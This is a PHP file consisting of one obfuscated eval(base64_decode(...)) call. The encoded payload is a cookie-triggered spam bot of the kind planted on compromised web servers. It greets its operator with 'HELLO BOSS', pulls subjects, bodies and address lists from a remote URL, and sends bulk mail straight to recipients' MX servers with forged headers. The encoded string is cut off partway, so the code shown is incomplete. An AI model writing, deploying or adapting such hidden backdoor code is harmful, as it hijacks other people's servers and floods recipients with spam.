<?php eval(base64_decode('CkBpZ25vcmVfdXNlcl9hYm9ydCgiMSIpOwpAc2V0X3RpbWVfbGltaXQoMCk7CkBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLGZhbHNlKTsKQGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLGZhbHNlKTsKQGluaV9zZXQoIm1lbW9yeV9saW1pdCIsIi0xIik7CkBlcnJvcl9yZXBvcnRpbmcoRV9BTEwpOwoKJHBocHZlciA9IHN0cl9yZXBsYWNlKCcuJywnJyxwaHB2ZXJzaW9uKCkpOyBpZiAoc3RybGVuKCRwaHB2ZXIpPDMpIHdoaWxlIChzdHJsZW4oJHBocHZlcik8MykgJHBocHZlci49JzAnOyBpZihpbnR2YWwoJHBocHZlcikgPCA0MTApIHsgJF9QT1NUPSYkSFRUUF9QT1NUX1ZBUlM7CSRfR0VUPSYkSFRUUF9HRVRfVkFSUzsgJF9TRVJWRVI9JiRIVFRQX1NFUlZFUl9WQVJTOyAkX0NPT0tJRT0mJEhUVFBfQ09PS0lFX1ZBUlM7IH0KCmRlZmluZSgnRVJSTk9fRUFHQUlOJywgMTEpOwpkZWZpbmUoJ0VSUk5PX0VXT1VMREJMT0NLJywgRVJSTk9fRUFHQUlOKTsKZGVmaW5lKCdFUlJOT19FSU5QUk9HUkVTUycsIDExNSk7CgpkZWZpbmUoJ0ROU19TRVJWRVInLCAnMjEyLjIxNi4xMTIuMTEyJyk7CmRlZmluZSgnQ1JMRicsICJcclxuIik7Cgokc3ViamVjdD0iIjsKJGZyb209IiI7CiRib2R5PSIiOwokaG9zdD0iIjsKCiR0b3RhbF9nb29kPTA7CiR0b3RhbF9iYWQ9MDsKCiRzZWxmX3R5cGU9InNpbmdsZSI7IC8vb3IgYmxvY2sKJGJsb2NrX3NpemU9MTA7CgpzcmFuZCh0aW1lKCkpOwoKaWYgKGlzc2V0KCRfQ09PS0lFWydjaGVjayddKSkKewoJJHJlcz1fZ2V0KCJodHRwOi8vd3d3LnlhbmRleC5ydS8iKTsKCWlmIChlbXB0eSgkcmVzKSkgZXhpdCgiW0ZVQ0sgT0ZGXSIpOwoJCglpZiAoZnVuY3Rpb25fZXhpc3RzKCdzb2NrZXRfc2VsZWN0JykpIAoJewoJCSRjaGVja19lbWFpbHM9YXJyYXkoInRlc3RAeWFob28uY29tIiwidGVzdEBhb2wuY29tIiwidGVzdEBob3RtYWlsLmNvbSIpOwoJCSRyZXQ9c2VuZF9ibG9jaygkY2hlY2tfZW1haWxzLHRydWUpOwoJCWlmICgkcmV0WzBdPjApIGV4aXQoIltBTEwgT0tdW0JMT0NLXSIpOwoJfQoJaWYgKCRzZWxmX3R5cGU9PT0ic2luZ2xlIiAmJiBmdW5jdGlvbl9leGlzdHMoJ2dldG14cnInKSAmJiBmdW5jdGlvbl9leGlzdHMoJ2dldGhvc3RieW5hbWVsJykpCgl7CgkJaWYgKDI1MD09c2VuZF9lbWFpbCgidGVzdC5ob3N0IiwidGVzdEB5YWhvby5jb20iLCJ0ZXN0QGRvbWFpbi5jb20iLCJ0ZXN0Iix0cnVlKSkgZXhpdCgiW0FMTCBPS11bU0lOR0xFXSIpOwoJfQoJZXhpdCgiW0ZVQ0sgT0ZGXSIpOwp9CgppZiAoaXNzZXQoJF9DT09LSUVbJ3VybCddKSAmJiBpc3NldCgkX0NPT0tJRVsndHlwZSddKSkKewoJZWNobyAiSEVMTE8gQk9TUyBMRVRTIFRSWSBUTyBXT1JLXG4iOwoJZWNobyAiPGhyPlxuIjsKCQoJaWYgKCRfQ09PS0lFWyd0eXBlJ109PSJibG9jayIpCgl7CgkJJHNlbGZfdHlwZT0iYmxvY2siOwoJCSRibG9ja19zaXplPTUwOwoJCWlmIChpc3NldCgkX0NPT0tJRVsnYmxvY2snXSkgJiYgaXNfbnVtZXJpYygkX0NPT0tJRVsnYmxvY2snXSkgJiYgJF9DT09LSUVbJ2Jsb2NrJ10+MCAmJiAkX0NPT0tJRVsnYmxvY2snXTw9MjAwKSAkYmxvY2tfc2l6ZT0kX0NPT0tJRVsnYmxvY2snXTsKCX0KCQoJJGhvc3Q9JF9TRVJWRVJbJ0hUVFBfSE9TVCddOwoJJGhvc3RfaXA9Z2V0aG9zdGJ5bmFtZSgkaG9zdCk7CglpZiAoaXNfaXAoJGhvc3RfaXApKQoJewoJCSRyZXZlcnNlX2hvc3QgPSBnZXRob3N0YnlhZGRyKCRob3N0X2lwKTsKCQlpZiAoIWlzX2lwKCRyZXZlcnNlX2hvc3QpKSAkaG9zdD0kcmV2ZXJzZV9ob3N0OwoJfQoJCgkvL0xPQUQgVkFSUwoJLy9odHRwOi8vaG9zdC5jb20vc2NyaXB0LnBocD9udW09Tk4mdmFycz0xCgkkdXJsPXN0cmlwc2xhc2hlcygkX0NPT0tJRVsndXJsJ10pLiRibG9ja19zaXplOwoJJHZhcnM9X2dldCgkdXJsLiImdmFycz0xIik7CglpZiAocHJlZ19tYXRjaCgnJTxzdWJqZWN0PiguKj8pPC9zdWJqZWN0PiVzJywkdmFycywkc3ViamVjdHYpCgkmJiBwcmVnX21hdGNoKCclPGJvZHk+KC4qPyk8L2JvZHk+JXMnLCR2YXJzLCRib2R5dikKCSYmIHByZWdfbWF0Y2goJyU8ZnJvbT4oLio/KTwvZnJvbT4lcycsJHZhcnMsJGZyb212KSkKCXsKCQkkc3ViamVjdD0kc3ViamVjdHZbMV07CgkJJGJvZHk9JGJvZHl2WzFdOwoJCSRmcm9tPSRmcm9tdlsxXTsKCQl1bnNldCgkZnJvbXYsJGJvZHl2LCRzdWJqZWN0dik7Cgl9CgllbHNlIGV4aXQoIkVSUk9SOjEwMDJcbiIpOwoJCgkvL1NUQVJUIFNFTkQKCSR0aW1lPXRpbWUoKTsKCSRtbWNvdW50PTA7CgkkbWFpbl9icmVhaz1mYWxzZTsKCSRsb2NhbF9nb29kPTA7CgkkbG9jYWxfYmFkPTA7Cgl3aGlsZSAoISRtYWluX2JyZWFrKQoJewoJCSRlbWFpbHM9X2dldCgkdXJsLiImZz0kbG9jYWxfZ29vZCZiPSRsb2NhbF9iYWQiKTsKCQkkbG9jYWxfZ29vZD0wOwoJCSRsb2NhbF9iYWQ9MDsKCQlpZiAoIXN0cmxlbigkZW1haWxzKSkgeyBlY2hvICJiYWQgZW1haWxzOiAkZW1haWxzXG4iOyBicmVhazsgfQoJCSRlbWFpbHM9c3RyX3JlcGxhY2UoIlxyIiwiIiwkZW1haWxzKTsKCQkkbWFpbHNfbGlzdD1leHBsb2RlKCJcbiIsJGVtYWlscyk7CgkJaWYgKCFjb3VudCgkbWFpbHNfbGlzdCkpIHsgZWNobyAibWFpbHNfbGlzdCBpcyBlbXB0eVxuIjsgYnJlYWs7IH0KCQkkY291bnQ9Y291bnQoJG1haWxzX2xpc3QpOwoJCQoJCWlmIChzdHJsZW4oJG1haWxzX2xpc3RbJGNvdW50LTFdKT09MCkgeyBhcnJheV9zcGxpY2UoJG1haWxzX2xpc3QsLTEpOyAkY291bnQtLTsgfQoJCWlmIChzdHJwb3MoJG1haWxzX2xpc3RbJGNvdW50LTFdLCJFT0YiKSE9PWZhbHNlKSB7IGFycmF5X3NwbGljZSgkbWFpbHNfbGlzdCwtMSk7ICRjb3VudC0tOyAkbWFpbl9icmVhaz10cnVlOyB9CgkJCgkJaWYgKCRzZWxmX3R5cGU9PT0ic2luZ2xlIikKCQl7CgkJCgkJCSRyYW5kb21fbnVtID0gcmFuZCgxMDAwLCA1OTAwMCk7CgkJCSRyYW5kb25fbnVtMiA9IHJhbmQoMTAwMCwgNTkwMDApOwoJCQkkU0VORCAgPSAiUmVjZWl2ZWQ6IChxbWFpbCAkcmFuZG9tX251bSBpbnZva2VkIGJ5IHVpZCAkcmFuZG9uX251bTIpOyAiLmdtZGF0ZSgiZCBNIFkgSDppOnMgTyIpLkNSTEY7CgkJCSRTRU5EIC49ICJEYXRlOiAiLmdtZGF0ZSgiZCBNIFkgSDppOnMgTyIpLkNSTEY7CgkJCSRTRU5EIC49ICJNZXNzYWdlLUlEOiA8Ii5nbWRhdGUoIlltZEhpcyIpLiIuJHJhbmRvbV9udW0ucW1haWxAIi4kaG9zdC4iPiIuQ1JMRjsKCQkJJFNFTkQgLj0gIlN1YmplY3Q6ICIuJHN1YmplY3QuQ1JMRjsKCQkJJFNFTkQgLj0gIlJlcGx5LVRvOiAkZnJvbSIuQ1JMRjsKCQkJJFNFTkQgLj0gIk1JTUUtVmVyc2lvbjogMS4wIi5DUkxGOwoJCQkkU0VORCAuPSAiQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9XCJpc28tODg1OS0xXCIiLkNSTEY7CgkJCSRTRU5EIC49ICJDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiA4Yml0Ii5DUkxGOwoJCQkkU0VORCAuPSAiRnJvbTogPCRmcm9tPiIuQ1JMRjsKCQkJJFNFTkQgLj0gIlRvOiAkYWRkcmVzcyIuQ1JMRjsKCQkJJFNFTkQgLj0gIlgtUHJpb3JpdHk6IDMiLkNSTEY7CgkJCSRTRU5EIC49IENSTEY7CgkJCSRTRU5EIC49ICRib2R5LkNSTEY7CgkJCSRTRU5EIC49IENSTEYuIi4iLkNSTEY7CQoJCQoJCQlmb3JlYWNoICgkbWFpbHNfbGlzdCBhcyAkYWRkcmVzcykgaWYgKDI1MD09c2VuZF9lbWFpbCgkaG9zdCwkYWRkcmVzcywkZnJvbSwkU0VORCkpICRsb2NhbF9nb29kKys7IGVsc2UgJGxvY2FsX2JhZCsrOwoJCQkkdG90YWxfZ29vZCs9JGxvY2FsX2dvb2Q7CgkJCSR0b3RhbF9iYWQrPSRsb2NhbF9iYWQ7CgkJCWlmICgkbW1jb3VudD49MTApCgkJCXsKCQkJCWlmICgkdG90YWxfZ29vZD09MCkgZXhpdCgiRVJST1I6MTAwM1xuIik7CgkJCQllbHNlICRtbWNvdW50PTA7CgkJCX0KCQkJZWxzZSAkbW1jb3VudCsrOwoJCX0KCQllbHNlCgkJewoJCQkkcmV0PXNlbmRfYmxvY2soJG1haWxzX2xpc3QpOwoJCQkkbG9jYWxfZ29vZD0kcmV0WzBdOwoJCQkkbG9jYWxfYmFkPSRyZXRbMV07CgkJCSR0b3RhbF9nb29kKz0kbG9jYWxfZ29vZDsKCQkJJHRvdGFsX2JhZCs9JGxvY2FsX2JhZDsJCQkKCQkJaWYgKCRsb2NhbF9nb29kPT0wKSBleGl0KCJFUlJPUjoxMDA0XG4iKTsKCQl9CgkJCgl9CgoJZXhpdCgiR09PRDogJHRvdGFsX2dvb2QgQkFEOiAkdG90YWxfYmFkXG4iKTsKfQoKZnVuY3Rpb24gX2dldCgkdXJsKQp7CgkkcmVzcG9uc2UgPSAnJzsKCglpZiAoZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSkKCXsKCQkkYz1jdXJsX2luaXQoJHVybCk7CgkJY3VybF9zZXRvcHQoJGMsMTk5MTMsMSk7CgkJJHQ9Y3VybF9leGVjKCRjKTsKCQlpZighY3VybF9lcnJubygkYykpJHJlc3BvbnNlPSR0OwoJCWN1cmxfY2xvc2UoJGMpOwoJfQoKCWlmIChlbXB0eSgkcmVzcG9uc2UpICYmIGZ1bmN0aW9uX2V4aXN0cygnaW5pX2dldCcpICYmIGluaV9nZXQoJ2FsbG93X3VybF9mb3BlbicpKQoJewoJCSRmcCA9IEBmb3BlbigkdXJsLCAncicpOwoJCWlmIChpc19yZXNvdXJjZSgkZnApKQoJCXsKCQkJc3RyZWFtX3NldF90aW1lb3V0KCRmcCwgMyk7CgkJCXdoaWxlICghZmVvZigkZnApKQoJCQkkcmVzcG9uc2UuPUBmZ2V0cygkZnAsIDQwOTYpOwoJCQlmY2xvc2UoJGZwKTsKCQl9Cgl9CgoJaWYgKGVtcHR5KCRyZXNwb25zZSkgJiYgZnVuY3Rpb25fZXhpc3RzKCdmc29ja29wZW4nKSkKCXsKCQkkcD1AcGFyc2VfdXJsKCR1cmwpOyBpZiAoIWlzc2V0KCRwWydob3N0J10pKSByZXR1cm4gJHJlc3BvbnNlOyAkaG9zdD0kcFsnaG9zdCddOyAkdXJpPSRwWydwYXRoJ107IGlmIChpc3NldCgkcFsncXVlcnknXSkpICR1cmkuPSI/Ii4kcFsncXVlcnknXTsKCQlpZiAoJGhvc3QgPT09ICgkaXAgPSBnZXRob3N0YnluYW1lKCRob3N0KSkpICRpcCA9ICI4NC4xNi4yMzAuNDgiOwoJCSRyZXE9IkdFVCAkdXJpIEhUVFAvMS4xXHJcbkhvc3Q6ICRob3N0XHJcbkFjY2VwdDogKi8qXHJcblVzZXItQWdlbnQ6IENsaWVudCB2Mi4wXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iOwoJCWZvcigkaT0wOyRpPDM7JGkrKykgaWYgKGlzX3Jlc291cmNlKCRmcD1mc29ja29wZW4oJGlwLDgwLCRlcnJubywgJGVycnN0ciwgMSkpKSBicmVhazsKCgkJaWYgKGlzX3Jlc291cmNlKCRmcCkpCgkJewoJCQkkY2h1bmtlZCA9IGZhbHNlOwoJCQlmd3JpdGUoJGZwLCAkcmVxKTsKCQkJd2hpbGUgKCFmZW9mKCRmcCkpCgkJCXsKCQkJCSRsaW5lID0gc3RydG9sb3dlcih0cmltKGZnZXRzKCRmcCwgMTAyNCkpKTsKCQkJCWlmICgkbGluZSA9PSAnJykgYnJlYWs7CgkJCQllbHNlaWYoISRjaHVua2VkICYmIEBzdHJwb3MoJGxpbmUsJ3RyYW5zZmVyLWVuY29kaW5nJykhPT1mYWxzZSAmJiBAc3RycG9zKCRsaW5lLCdjaHVua2VkJykhPT1mYWxzZSkKCQkJCSRjaHVua2VkID0gdHJ1ZTsKCQkJfQoKCQkJJHJlc3BvbnNlID0gJyc7CgkJCXdoaWxlICghZmVvZigkZnApKSAkcmVzcG9uc2UuPUBmZ2V0cygkZnAsIDEwMjQqMTI4KTsKCQkJZmNsb3NlKCRmcCk7CgoJCQlpZiAoJGNodW5rZWQpCgkJCXsKCQkJCSRyZXNwb25zZV9jID0gJyc7CgkJCQkkc2l6ZSA9IE5VTEw7CgkJCQl3aGlsZSh0cnVlKQoJCQkJewoJCQkJCSRwb3MgPSBAc3RycG9zKCRyZXNwb25zZSwgIlxuIik7CgkJCQkJaWYoISgkcG9zID09PSBmYWxzZSkgJiYgJHNpemUgPT09IE5VTEwpCgkJCQkJewoJCQkJCQkkc2l6ZSA9IGhleGRlYyhzdWJzdHIoJHJlc3BvbnNlLCAwLCAkcG9zKSk7CgkJCQkJCSRyZXNwb25zZV9jIC49IHN1YnN0cigkcmVzcG9uc2UsICRwb3MrMSwgJHNpemUpOwoJCQkJCQkkcmVzcG9uc2UgPSBzdWJzdHIoJHJlc3BvbnNlLCAoJHBvcysxKSArICRzaXplKTsKCQkJCQkJJHNpemUgPSBOVUxMOwoJCQkJCX0KCQkJCQllbHNlIGJyZWFrOwoJCQkJfQoJCQkJJHJlc3BvbnNlID0gJHJlc3BvbnNlX2M7CgkJCX0KCQl9Cgl9CglyZXR1cm4gJHJlc3BvbnNlOwp9CgpmdW5jdGlvbiBnZXRfbGluZXMoJGNvbm4pCnsKCSRkYXRhID0gIiI7Cgl3aGlsZSgkc3RyID0gQGZnZXRzKCRjb25uLDEwMjQpKSB7CgkJJGRhdGEgLj0gJHN0cjsKCQlpZihzdWJzdHIoJHN0ciwzLDEpID09ICIgIikgeyBicmVhazsgfQoJfQoJcmV0dXJuICRkYXRhOwp9CgpmdW5jdGlvbiBzZW5kX2NvbW1hbmQoJHNvY2tldCwkY29tbWFuZCwkbmVlZF9jb2RlcywmJGNvZGUpCnsKCgoJZndyaXRlKCRzb2NrZXQsJGNvbW1hbmQpOwoJJHJwbHkgPSBnZXRfbGluZXMoJHNvY2tldCk7CgkkY29kZSA9IHN1YnN0cigkcnBseSwwLDMpOwoKCSRnb29kPWZhbHNlOwoJaWYgKGlzX2FycmF5KCRuZWVkX2NvZGVzKSkKCXsKCQlmb3JlYWNoICgkbmVlZF9jb2RlcyBhcyAkbmVlZF9jb2RlKSBpZiAoaW50dmFsKCRjb2RlKT09aW50dmFsKCRuZWVkX2NvZGUpKSB7ICRnb29kPXRydWU7IGJyZWFrOyB9Cgl9CgllbHNlIGlmIChpbnR2YWwoJG5lZWRfY29kZXMpPT1pbnR2YWwoJGNvZGUpKSAkZ29vZD10cnVlOwoKCWlmICghJGdvb2QpCgl7CgkJZndyaXRlKCRzb2NrZXQsIlFVSVQiLkNSTEYpOwoJCWdldF9saW5lcygkc29ja2V0KTsKCQlmY2xvc2UoJHNvY2tldCk7Cgl9CgoJcmV0dXJuICRnb29kOwp9Cgokc214X2NhY2hlPWFycmF5KCk7CgpmdW5jdGlvbiBzZW5kX2VtYWlsKCRoZWxvLCR0b2FkZHIsJGZyb21hZGRyLCRkYXRhLCRjaGVja19tb2RlPWZhbHNlKQp7CglnbG9iYWwgJHNteF9jYWNoZTsKCgkkY29ubmVjdF90aW1lb3V0ID0gNTsKCSRjb2RlPSIiOwoKCWxpc3QoJHRvbmFtZSwkdG9kb21haW4pID0gZXhwbG9kZSgiQCIsJHRvYWRkcik7CgoJJG14eiA9IGFycmF5KCk7CgkkaXBzID0gYXJyYXkoKTsKCglpZiAoIWlzc2V0KCRzbXhfY2FjaGV7JHRvZG9tYWlufSkpCgl7CgkJZ2V0bXhycigkdG9kb21haW4sJG14eik7CgkJZm9yZWFjaCAoJG14eiBhcyAkY214KSB7IGlmIChGQUxTRSE9PSgkaG9zdGJ5bmFtZWw9Z2V0aG9zdGJ5bmFtZWwoJGNteCkpKSAkaXBzPWFycmF5X21lcmdlKCRpcHMsJGhvc3RieW5hbWVsKTsgfQoJCWlmIChjb3VudCgkaXBzKT4wKSAkc214X2NhY2hleyR0b2RvbWFpbn09JGlwczsKCX0KCWVsc2UgJGlwcz0kc214X2NhY2hleyR0b2RvbWFpbn07CgoJZm9yZWFjaCAoJGlwcyBhcyAkbXhfcmVjb3JkKQoJewoJCSRteF9zZXJ2ZXIgPSAkbXhfcmVjb3JkOwoJCSRteCA9IEBmc29ja29wZW4oJG14X3NlcnZlciwyNSwkZXJybm8sJGVycnN0ciwkY29ubmVjdF90aW1lb3V0KTsKCQlpZiAoZW1wdHkoJG14KSkKCQl7CgkJCSRjb2RlPSI2MDAiOwoJCQljb250aW51ZTsKCQl9CgoJCSRhbm5vdW5jZSA9IGdldF9saW5lcygkbXgpOwoKCQlpZiAoJGNoZWNrX21vZGUpCgkJewoJCQlmd3JpdGUoJHNvY2tldCwiUVVJVCIuQ1JMRik7CgkJCWdldF9saW5lcygkc29ja2V0KTsKCQkJZmNsb3NlKCRzb2NrZXQpOwoJCQlyZXR1cm4gMjUwOwoJCX0KCgkJLy9IRUxPIGhvc3QKCQlpZiAoIXNlbmRfY29tbWFuZCgkbXgsIkhFTE8gJGhlbG8iLkNSTEYsMjUwLCRjb2RlKSkgY29udGludWU7CgkJLy9NQUlMIEZST006PG1haWxAbWFpbC5jb20+CgkJaWYgKCFzZW5kX2NvbW1hbmQoJG14LCJNQUlMIEZST006PCIuJGZyb21hZGRyLiI+Ii5DUkxGLDI1MCwkY29kZSkpIGNvbnRpbnVlOwoJCS8vUkNQVCBUTzo8bWFpbEBtYWlsLmNvbT4KCQlpZiAoIXNlbmRfY29tbWFuZCgkbXgsIlJDUFQgVE86PCIuJHRvYWRkci4iPiIuQ1JMRixhcnJheSgyNTAsMjUxKSwkY29kZSkpIGNvbnRpbnVlOwoJCS8vREFUQQoJCWlmICghc2VuZF9jb21tYW5kKCRteCwiREFUQSIuQ1JMRiwzNTQsJGNvZGUpKSBjb250aW51ZTsKCgkJJGRhdGE9c3RyX3JlcGxhY2UoIlxyIiwiIiwkZGF0YSk7CgkJJGRhdGE9c3RyX3JlcGxhY2UoIlxuIixDUkxGLCRkYXRhKTsKCgkJaWYgKCFzZW5kX2NvbW1hbmQoJG14LCRkYXRhLDI1MCwkY29kZSkpIGNvbnRpbnVlOwoJCWVsc2UgYnJlYWs7CgoJfQoKCXJldHVybiAkY29kZTsKCn0KCmZ1bmN0aW9uIGlzX2lwKCRzdHIpCnsKCWZvciAoJGk9MDskaTxzdHJsZW4oJHN0cik7JGkrKykgaWYgKCgkc3RyeyRpfT49JzAnICYmICRzdHJ7JGl9PD0nOScpIHx8ICRzdHJ7JGl9PT0nLicpIDsgZWxzZSByZXR1cm4gZmFsc2U7CglyZXR1cm4gdHJ1ZTsKfQoKCgovL0JMT0NLIFNFTkQgRlVOQ1RJT05TCiRteF9jYWNoZT1hcnJheSgpOwokd29ya2Vycz1hcnJheSgpOwoKZnVuY3Rpb24gc2VuZF9ibG9jaygkYWRkcmVzcywkY2hlY2tfbW9kZT1mYWxzZSkKewoJZ2xvYmFsICRteF9jYWNoZSwkaG9zdCwkZnJvbSwkYm9keSwkc3ViamVjdCwkd29ya2VyczsKCQoJJHJldHVybj1hcnJheSgwLDApOwoJaWYgKGNvdW50KCR3b3JrZXJzKSkgYXJyYXlfc3BsaWNlKCR3b3JrZXJzLDApOwoJCgkkZG9tYWlucz1hcnJheSgpOwoJZm9yZWFjaCAoJGFkZHJlc3MgYXMgJGk9PiR0b2FkZHIpCgl7CgkJbGlzdCgkdG9uYW1lLCR0b2RvbWFpbikgPSBleHBsb2RlKCJAIiwkdG9hZGRyKTsKCQkkdG9kb21haW49c3RydG9sb3dlcigkdG9kb21haW4pOwoJCSRhZGRyZXNzWyRpXT0kdG9uYW1lLiJAIi4kdG9kb21haW47CgkJCgkJaWYgKCFpc3NldCgkbXhfY2FjaGV7JHRvZG9tYWlufSkpICRkb21haW5zW109c3RydG9sb3dlcigkdG9kb21haW4pOwoJfQoJJG14X3NlcnZlcnNfZm9yX2RvbWFpbnMgPSBkbnNfZ2V0X2xpc3QoRE5TX1NFUlZFUiwkZG9tYWlucywxNSk7CgkkbXhfc2VydmVyc19ieV9vbmUgPSBhcnJheSgpOwoJZm9yZWFjaCAoJG14X3NlcnZlcnNfZm9yX2RvbWFpbnMgYXMgJHYpICRteF9zZXJ2ZXJzX2J5X29uZVtdPSR2WzBdOwoJJGlwc19mb3JfbXhfc2VydmVycz1kbnNfZ2V0X2xpc3QoRE5TX1NFUlZFUiwkbXhfc2VydmVyc19ieV9vbmUsMSk7CgoJZm9yZWFjaCAoJGlwc19mb3JfbXhfc2VydmVycyBhcyAkbXhfc2VydmVyPT4kaXBzKQoJewoJCWlmIChjb3VudCgkaXBzKT4yKSBhcnJheV9zcGxpY2UoJGlwcywyKTsKCQlmb3JlYWNoICgkbXhfc2VydmVyc19mb3JfZG9tYWlucyBhcyAkZG9tYWluPT4kbXhfbGlzdCkgaWYgKCRteF9zZXJ2ZXI9PT0kbXhfbGlzdFswXSkgeyAkbXhfY2FjaGV7JGRvbWFpbn09JGlwczsgYnJlYWs7IH0KCX0KCQoJZm9yZWFjaCAoJGFkZHJlc3MgYXMgJHRvYWRkcikKCXsKCQlsaXN0KCR0b25hbWUsJHRvZG9tYWluKSA9IGV4cGxvZGUoIkAiLCR0b2FkZHIpOwoJCQoJCWlmICghaXNzZXQoJG14X2NhY2hleyR0b2RvbWFpbn0pKSBjb250aW51ZTsKCQkKCQlpZiAoRkFMU0UgIT09ICRzb2NrZXQ9c29ja2V0X2Nvbm5lY3RfbmIoJG14X2NhY2hlWyR0b2RvbWFpbl1bMF0sMjUpKQoJCXsKCQkJCgkJCSRkYXRhPWFycmF5KAoJCQkJJ2Nvbm4nPT4kc29ja2V0LAoJCQkJJ3RyeSc9PjAsCgkJCQknbXhfbnVtJz0+MCwKCQkJCSdteF9pcHMnPT4kbXhfY2FjaGVbJHRvZG9tYWluXSwKCQkJCSdzdGVwJz0+MCwKCQkJCSdhZGRyZXNzJz0+JHRvYWRkciwKCQkJCSdyZWN2X2J1Zic9PiIiLAoJCQkJJ3JlY3ZfbGVuJz0+MCwKCQkJCSdzZW5kX2J1Zic9PiIiLAoJCQkJJ3NlbmRfbGVuJz0+MCwKCQkJCSdyZXQnPT4wCgkJCSk7CgkJCSR3b3JrZXJzW109JGRhdGE7CgkJfQoKCX0KCQoJJHJlYWQ9YXJyYXkoKTsKCSR3cml0ZT1hcnJheSgpOwoJCgl3aGlsZSAodHJ1ZSkKCXsKCQkkZXZlbnRfY291bnQ9MDsKCQlmb3JlYWNoICgkd29ya2VycyBhcyAkd2lkPT4kZGF0YSkgCgkJCWlmICgkZGF0YVsncmV0J109PTAgJiYgJGRhdGFbJ2Nvbm4nXSE9MCkKCQkJewkJCQoJCQkJaWYgKCRkYXRhWydzdGVwJ109PTAgfHwgKCRkYXRhWydzdGVwJ10lMik9PTApICR3cml0ZVtdPSRkYXRhWydjb25uJ107CgkJCQllbHNlICRyZWFkW109JGRhdGFbJ2Nvbm4nXTsKCQkJCSRldmVudF9jb3VudCsrOwoJCQl9CgkJCgkJLy9lY2hvICJCRUZPUkUgRVZFTlRTIFJFQUQ6ICIuY291bnQoJHJlYWQpLiIgV1JJVEU6ICIuY291bnQoJHdyaXRlKS4iXG4iOyBAZmx1c2goKTsgQG9iX2ZsdXNoKCk7CgkJCgkJCgkJLy8vLy8vLy8vLy8vLyBTRUxFQ1QgLy8vLy8vLy8vLy8vLy8KCQkkcmV0PUBzb2NrZXRfc2VsZWN0KCRyZWFkLCAkd3JpdGUsICRleGNlcHQ9TlVMTCwgNSk7CgkJaWYgKGZhbHNlID09PSAkcmV0IHx8ICRyZXQ9PTApCgkJewoJCQlmb3JlYWNoICgkd29ya2VycyBhcyAkaT0+JGRhdGEpIGlmICgkZGF0YVsnY29ubiddIT0wKSB7IEBzb2NrZXRfc2h1dGRvd24oJGRhdGFbJ2Nvbm4nXSk7IEBzb2NrZXRfY2xvc2UoJGRhdGFbJ2Nvbm4nXSk7ICR3b3JrZXJzWyRpXVsnY29ubiddPTA7IH0KCQkJaWYgKGNvdW50KCRyZWFkKSB8fCBjb3VudCgkd3JpdGUpKSBlY2hvICJzb2NrZXRfc2VsZWN0IGxhc3QgZXJyb3IgPSAiLnNvY2tldF9sYXN0X2Vycm9yKCkuIlxuIjsKCQkJZWxzZQoJCQl7CgkJCQllY2hvICJzZWxlY3QgdGltZW91dCBhbmQgZXhpdCBlcnJubzogIi5zb2NrZXRfbGFzdF9lcnJvcigpLiJcbiI7CgkJCQkKCQkJfQoJCQlzb2NrZXRfY2xlYXJfZXJyb3IoKTsKCQkJYnJlYWs7CgkJfQoJCQoJCS8vaWYgKCFjb3VudCgkcmVhZCkgJiYgIWNvdW50KCR3cml0ZSkpIGV4aXQoIkJMQUJMQSIpOwoJCS8vZWNobyAiQUZURVIgRVZFTlRTIFJFQUQ6ICIuY291bnQoJHJlYWQpLiIgV1JJVEU6ICIuY291bnQoJHdyaXRlKS4iXG4iOyBAZmx1c2goKTsgQG9iX2ZsdXNoKCk7CgoKCQlpZiAoY291bnQoJHJlYWQpKQoJCXsKCQkJZm9yZWFjaCAoJHJlYWQgYXMgJHNvY2tldCkKCQkJewoJCQkJJHdpZD1maW5kX3dvcmtlcigkc29ja2V0KTsKCQkJCSR3b3JrZXJzWyR3aWRdWyd0cnknXT0wOwoKCQkJCSRidWY9IiI7CgkJCQlpZiAoRkFMU0U9PT0kcmV0PXNvY2tldF9yZWN2KCRzb2NrZXQsJGJ1ZiwxMDI0LDApKQoJCQkJewoJCQkJCWlmIChzb2NrZXRfbGFzdF9lcnJvcigpIT1FUlJOT19FV09VTERCTE9DSykKCQkJCQl7CgkJCQkJCWVjaG8gInNvY2tldF9yZWN2IGxhc3QgZXJyb3IgPSAiLnNvY2tldF9sYXN0X2Vycm9yKCkuIlxuIjsKCQkJCQkJc29ja2V0X2NsZWFyX2Vycm9yKCk7CgkJCQkJCW5leHRteCgkd2lkKTsKCQkJCQkJY29udGludWU7CgkJCQkJfQoJCQkJCXNvY2tldF9jbGVhcl9lcnJvcigpOwoJCQkJCWNvbnRpbnVlOwoJCQkJfQoJCQkJCgkJCQkkd29ya2Vyc1skd2lkXVsncmVjdl9idWYnXS49JGJ1ZjsKCQkJCSR3b3JrZXJzWyR3aWRdWydyZWN2X2xlbiddKz0kcmV0OwoJCQkJCgkJCQkkbGFzdGxpbmU9IiI7CgkJCQkKCQkJCS8vZWNobyAicmVjdl9idWY6ICIuJHdvcmtlcnNbJHdpZF1bJ3JlY3ZfYnVmJ10uInxcbiI7IEBmbHVzaCgpOyBAb2JfZmx1c2goKTsKCQkJCQoJCQkJZm9yICgkaT0wOyRpPCR3b3JrZXJzWyR3aWRdWydyZWN2X2xlbiddOyRpKyspCgkJCQlpZiAoc3Vic3RyKCR3b3JrZXJzWyR3aWRdWydyZWN2X2J1ZiddLCRpLDEpPT0iXG4iKQoJCQkJewoJCQkJCSRsYXN0bGluZT1zdWJzdHIoJHdvcmtlcnNbJHdpZF1bJ3JlY3ZfYnVmJ10sMCwkaSk7CgkJCQkJJHdvcmtlcnNbJHdpZF1bJ3JlY3ZfYnVmJ109c3Vic3RyKCR3b3JrZXJzWyR3aWRdWydyZWN2X2J1ZiddLCRpKzEpOwoJCQkJCSR3b3JrZXJzWyR3aWRdWydyZWN2X2xlbiddLT0kaSsxOwoJCQkJCSRpPTA7CgkJCQl9CgkJCQkKCgkJCQkKCQkJCSRjb2RlPXN1YnN0cigkbGFzdGxpbmUsMCwzKTsKCQkJCQoJCQkJaWYgKGlzX251bWVyaWMoJGNvZGUpICYmIHN1YnN0cigkbGFzdGxpbmUsMywxKT09JyAnKQoJCQkJewoJCQkJCS8vZWNobyAicmVjdlsiLiR3b3JrZXJzWyR3aWRdWydzdGVwJ10uIl06ICIuJGxhc3RsaW5lLiJ8fHxcbiI7CgkJCQkJc3dpdGNoICgkd2